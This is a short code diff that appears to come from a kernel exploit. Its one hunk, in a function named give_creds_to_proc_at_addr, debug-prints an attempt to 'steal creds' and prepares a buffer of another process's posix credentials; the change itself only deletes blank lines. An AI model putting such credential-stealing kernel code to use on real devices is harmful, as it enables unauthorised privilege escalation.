@@ -81,8 +81,6 @@ kptr_t give_creds_to_proc_at_addr(kptr_t proc, kptr_t creds) {
     
     if(g_exp.debug){
         printf("---> Trying to steal creds @0x%llx's...\n", proc);
-        
-        
         kptr_t cred_posix = creds + OFFSET(ucred, cr_posix);
         size_t cred_posix_size = SIZE(posix_cred);
         char stolen_cred[cred_posix_size];
